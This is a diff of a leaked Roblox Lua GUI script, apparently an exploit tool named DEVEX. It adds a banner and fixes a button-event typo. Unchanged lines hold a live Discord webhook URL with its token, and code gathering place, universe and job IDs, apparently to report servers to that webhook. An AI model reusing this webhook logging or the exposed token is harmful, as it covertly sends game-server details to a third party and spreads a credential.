@@ -1,5 +1,12 @@
---- DEVEX is open source now :(
---- if you wanna skid skid it and dont forget to give credits
+
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
 -- Instances: 27 | Scripts: 3 | Modules: 0 | Tags: 0
 local DEV2L = {};
@@ -264,7 +271,7 @@ local script = DEV2L["9"];
 	if not HttpService.HttpEnabled then return end
 	
 	local WEBHOOK_URL = "https://discord.com/api/webhooks/1454657705275949108/GyQimOdDoJpu2wGKgta-ZO-PL1V7E3buPpKsG2NDRwqEnzqtIetE5V9zqqf_H25KH7oy"
-
+	
 	local placeId = game.PlaceId
 	local universeId = game.GameId
 	local jobId = game.JobId
@@ -484,8 +491,9 @@ local script = DEV2L["9"];
 		sound:Play()
 	end)
 	
-	clear.MouseButtton1Click:Connect(function()
+	clear.MouseButton1Click:Connect(function()
 		input.Text = ""
+		sound:Play()
 	end)
 	
 	re.MouseButton1Click:Connect(function()
